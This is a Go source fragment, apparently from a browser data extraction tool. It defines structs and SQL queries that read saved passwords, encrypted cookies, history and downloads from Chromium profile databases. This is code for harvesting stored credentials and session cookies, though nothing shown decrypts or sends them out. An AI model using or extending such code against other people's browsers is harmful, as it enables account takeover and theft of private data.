package main

// This program is a simplified version with lesser functionality in comparison to the Pro version.
// The source code for the Pro/Premium version is currently private, but may be released in the future.

import (
	"database/sql"
	"fmt"
	"os"
)

type Login struct {
	URL      string `json:"origin_url"`
	Username string `json:"username_value"`
	Password string `json:"password_value"`
	Created  string `json:"date_created"`
	LastUsed string `json:"date_last_used"`
}

type Cookie struct {
	Host       string `json:"host_key"`
	Name       string `json:"name"`
	Value      string `json:"encrypted_value"`
	Created    string `json:"creation_utc"`
	Expires    bool   `json:"expires"`
	ExpiryDate string `json:"expires_utc"`
}

type Site struct {
	URL    string `json:"url"`
	Title  string `json:"title"`
	Visits string `json:"visit_count"`
}

type Download struct {
	Downloaded  string `json:"start_time"`
	CurrentPath string `json:"current_path"`
	TargetPath  string `json:"target_path"`
	FileSource  string `json:"file_source"`
}

type QueryDatabase struct {
	Logins    string
	Cookies   string
	History   string
	Downloads string
}

func (browser *Browser) CloseBrowserDatabase(db *sql.DB) {
	// Simply close and remove the passed SQL database (*sql.DB)
	db.Close()
	if err := os.Remove(browser.Paths.TempStorage); err != nil {
		fmt.Println(err)
	}
}

var QUERIES = QueryDatabase{
	Logins: `
		SELECT origin_url, username_value, password_value, date_created, date_last_used
		FROM logins
	`,
	Cookies: `
		SELECT host_key, name, encrypted_value, creation_utc, has_expires, expires_utc
		FROM cookies
	`,
	History: `
		SELECT url, title, visit_count
		FROM urls
	`,
	Downloads: `
		SELECT start_time, current_path, target_path, tab_url
		FROM downloads
	`,
}
